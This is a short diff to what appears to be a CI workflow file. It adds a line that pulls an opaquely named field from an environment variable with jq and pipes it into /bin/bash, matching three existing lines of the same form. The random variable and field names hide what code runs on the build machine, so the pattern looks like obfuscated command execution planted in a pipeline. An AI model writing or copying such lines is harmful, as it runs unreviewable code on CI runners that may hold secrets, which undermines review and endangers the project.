@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$rajgp450" | jq -r .gee512 | /bin/bash
           echo $sxud8 | jq -r .pa1 | /bin/bash
           echo $eer2195 | jq -r .sp49 | /bin/bash
+          printf '%s' "$xvlt2" | jq -r .byh275 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
